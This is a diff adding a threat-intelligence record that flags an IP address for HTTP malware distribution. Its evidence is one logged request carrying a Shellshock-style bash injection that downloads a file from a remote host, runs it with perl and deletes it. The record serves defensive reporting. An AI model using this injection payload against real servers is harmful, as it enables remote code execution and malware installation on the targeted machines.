@@ -1,0 +1,15 @@
+{
+  ip: '142.4.215.115'
+  recorded: '2014/09/30'
+  last_seen: '2014/09/24'
+  categories: [
+    "malware_dist.http"
+  ]
+
+  proof:
+    parts: {
+      "HTTP": [
+        '142.4.215.115 - - [30/Sep/2014:13:02:02 +0100] "GET /cgi-bin/hi HTTP/1.0" 404 545 "-" "() { :;}; /bin/bash -c "cd /tmp;wget http://89.33.193.10/ji;curl -O /tmp/ji http://89.33.193.10/ji ; perl /tmp/ji;rm -rf /tmp/ji""'
+      ]
+    }
+}
